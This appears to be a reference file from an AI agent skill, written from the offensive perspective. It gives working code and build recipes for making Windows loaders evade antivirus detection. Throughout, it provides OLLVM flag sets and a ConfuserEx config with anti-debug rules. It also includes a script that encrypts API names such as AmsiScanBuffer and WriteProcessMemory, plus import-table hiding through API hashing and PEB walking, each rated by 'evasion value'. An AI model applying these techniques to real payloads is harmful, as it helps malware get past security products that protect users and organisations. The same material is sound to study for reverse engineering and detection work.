# Compiler-Level Obfuscation — Implementation Guide

> **Belongs to**: `code-obfuscation-deobfuscation` skill (offensive/implementation perspective)
> **Load when**: You need to generate obfuscated binaries for AV evasion (before §§1-10 which are the defensive/RE perspective)

## 1. OLLVM (Obfuscator-LLVM) — Compile-time Obfuscation

OLLVM is an LLVM-based code obfuscation compiler that inserts obfuscation passes during compilation, generating semantically equivalent but structurally distinct code.

### Installation

```bash
# Clone OLLVM (recommended fork: https://github.com/heroims/obfuscator, supports LLVM 14.0+)
git clone https://github.com/heroims/obfuscator.git
cd obfuscator && mkdir build && cd build
cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=OFF ../llvm
make -j$(nproc)
```

### Four Passes — Selection Strategy

| Pass | Flag | Effect | Perf Cost | Evasion Value | Recommendation |
|---|---|---|---|---|---|
| **Control Flow Flattening** | `-mllvm -fla` | Split functions into switch-case dispatcher | ~30% | ★★★★★ | Always enable |
| **Instruction Substitution** | `-mllvm -sub` | Replace arithmetic/logic instrs with equivalent sequences | ~10% | ★★★★ | Always enable |
| **Bogus Control Flow** | `-mllvm -bcf` | Insert never-executed bogus branches | ~20% | ★★★★ | Always enable |
| **String Encryption** | `-mllvm -sobf` | Compile-time encrypt all strings, runtime decrypt | ~5% | ★★★★★ | Always enable |

### Build Recipes

```bash
# Standard evasion config (balanced performance/strength)
x86_64-w64-mingw32-clang++ -O2 \
    -mllvm -fla \
    -mllvm -sub \
    -mllvm -bcf \
    -mllvm -bcf_loop=3 \
    -mllvm -bcf_prob=40 \
    -mllvm -sobf \
    loader.c -o loader.exe

# Extreme config (strength over performance)
x86_64-w64-mingw32-clang++ -O1 \
    -mllvm -fla \
    -mllvm -split \
    -mllvm -split_num=3 \
    -mllvm -sub \
    -mllvm -sub_loop=3 \
    -mllvm -bcf \
    -mllvm -bcf_loop=3 \
    -mllvm -bcf_prob=50 \
    -mllvm -sobf \
    loader.c -o loader_extreme.exe

# Lite config (quick verification)
x86_64-w64-mingw32-clang++ -O2 \
    -mllvm -sub \
    -mllvm -sobf \
    loader.c -o loader_lite.exe
```

**Tips**:
- 360 detects MSVC `/O2 + /Ob2` patterns → OLLVM compilation completely avoids this
- Some AVs flag OLLVM output as high-entropy → mix in normal code (printf, legitimate API calls)
- Never use OLLVM with `-O0` → optimize first (`-O1` or higher)

---

## 2. ConfuserEx — .NET Obfuscation

```xml
<!-- ConfuserEx evasion config (confuser.cr) -->
<project outputDir="obfuscated" baseDir="src">
    <module path="tool.exe">
        <!-- 1. Rename: all classes/methods/fields → unreadable chars -->
        <rule pattern="true" inherit="false">
            <protection id="rename" />
        </rule>
        <!-- 2. Control flow: break IL logic structure -->
        <rule pattern="true">
            <protection id="ctrl flow">
                <argument name="intensity" value="70" />
            </protection>
        </rule>
        <!-- 3. Constants: hide inline strings and constants -->
        <rule pattern="true">
            <protection id="constants" />
        </rule>
        <!-- 4. Resources: encrypt embedded DLLs/configs -->
        <rule pattern="true">
            <protection id="resources" />
        </rule>
        <!-- 5. Anti-debug: detect debugger attachment -->
        <rule pattern="true">
            <protection id="anti debug" />
        </rule>
        <!-- 6. Anti-tamper: detect binary modification -->
        <rule pattern="true">
            <protection id="anti tamper" />
        </rule>
        <!-- 7. Invalid metadata: inject garbage metadata -->
        <rule pattern="true">
            <protection id="invalid metadata" />
        </rule>
        <!-- 8. Reflection proxy: hide reflection calls -->
        <rule pattern="true">
            <protection id="ref proxy" />
        </rule>
    </module>
</project>
```

```bash
# Run obfuscation
Confuser.CLI.exe -n confuser.cr
```

---

## 3. String Encryption — Implementation Template

Manual string encryption/decryption, no compiler pass dependency, embeddable in any project:

```c
/**
 * Compile-time string encryption macro (C/C++)
 * Uses XOR + compile-time constant, leaves no plaintext strings in binary
 */

// Simple XOR encrypt/decrypt
static __forceinline void XorDecrypt(char *data, size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// EncryptedString struct for auto-decryption
typedef struct {
    char *data;
    size_t len;
    char key;
} EncryptedString;

char *DecryptString(EncryptedString *es) {
    char *plain = (char *)malloc(es->len + 1);
    memcpy(plain, es->data, es->len);
    XorDecrypt(plain, es->len, es->key);
    plain[es->len] = '\0';
    return plain;  // caller must free
}
```

```python
# Pre-encryption script (run before compilation)
# Outputs C header with all encrypted strings
import os

STRINGS_TO_ENCRYPT = [
    "VirtualAlloc", "CreateThread", "WriteProcessMemory",
    "kernel32.dll", "ntdll.dll", "NtAllocateVirtualMemory",
    "amsi.dll", "AmsiScanBuffer",
]

def encrypt_string(s):
    key = ord(os.urandom(1))
    encrypted = ','.join(f'0x{b ^ key:02X}' for b in s.encode())
    return f'{{(char[]){encrypted}, {len(s)}, 0x{key:02X}}}'

print("// Auto-generated encrypted strings")
for s in STRINGS_TO_ENCRYPT:
    print(f"static EncryptedString _s_{s} = {encrypt_string(s)};")
```

---

## 4. IAT Hiding — Complete Implementation

Hide Import Address Table so static analysis tools cannot see sensitive API calls.

### Method A: API Hash Dynamic Resolution

```c
/**
 * Dynamically resolve API addresses via DJB2 hash
 * No sensitive function names in import table
 */

DWORD Djb2Hash(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
    }
    return hash;
}

FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwHash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)
        ((BYTE *)hModule + pDos->e_lfanew);

    DWORD dwExportRVA = pNt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!dwExportRVA) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExport =
        (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hModule + dwExportRVA);

    PDWORD pNames = (PDWORD)((BYTE *)hModule + pExport->AddressOfNames);
    PWORD pOrdinals = (PWORD)((BYTE *)hModule + pExport->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)((BYTE *)hModule + pExport->AddressOfFunctions);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char *pszName = (const char *)((BYTE *)hModule + pNames[i]);
        if (Djb2Hash(pszName) == dwHash) {
            return (FARPROC)((BYTE *)hModule + pFunctions[pOrdinals[i]]);
        }
    }
    return NULL;
}

// Pre-compute hashes (before compilation):
// printf("VirtualAlloc:  0x%08X\n", Djb2Hash("VirtualAlloc"));

// Usage:
HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
pVirtualAlloc fnAlloc = (pVirtualAlloc)
    GetProcAddressByHash(hKernel32, 0x91AFCA54);  // DJB2("VirtualAlloc")
```

### Method B: Delayed Import + Manual Resolution

```c
/**
 * Completely remove specific DLL import entries, load manually at runtime
 * Advantage: kernel32.dll not in import table → static analysis sees no high-risk APIs
 * Implementation: Get kernel32 base via PEB → manually parse export table
 */

HMODULE GetKernel32Base() {
    // Via PEB's InMemoryOrderModuleList
    // kernel32.dll always loads after ntdll.dll (2nd entry)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink->Flink;  // skip self → ntdll → kernel32

    PLDR_DATA_TABLE_ENTRY pEntry =
        CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return (HMODULE)pEntry->DllBase;
}
```

### Method C: Forged Legitimate Import Table

```c
/**
 * Add hundreds of legitimate imports (e.g., user32.dll, gdi32.dll functions)
 * to the PE import table, drowning sensitive imports in noise
 * Implementation: Python pefile library script to modify PE
 */

# Python script: forge import table
import pefile
pe = pefile.PE("loader.exe")
# Add 200+ legitimate imports from user32.dll
# Real sensitive APIs resolved dynamically via Method A above
pe.write("loader_fake_imports.exe")
```

---

## 5. Obfuscation Quick Reference (Offensive Perspective)

| Target | Recommended Tool | Command/Config | Evasion Score |
|---|---|---|---|
| C/C++ compiler-level | OLLVM | `clang -mllvm -fla -mllvm -sub -mllvm -bcf -mllvm -sobf` | ★★★★★ |
| .NET full obfuscation | ConfuserEx | Config with rename+ctrlflow+constants+resources | ★★★★ |
| String hiding | Manual XOR/AES macros | Python pre-encrypt script + runtime decrypt | ★★★★★ |
| IAT hiding | API hashing | DJB2/CRC32 hash + PEB export walk | ★★★★★ |
| PE header mod | Python pefile / C manual | Section rename + Rich Header clear + timestamp forge | ★★★☆ |
| Go binary obfuscation | garble | `garble -literals -tiny build` | ★★★☆ |
| Runtime SMC | Manual impl | Encrypt .text + decrypt before exec + re-encrypt after | ★★★★ |
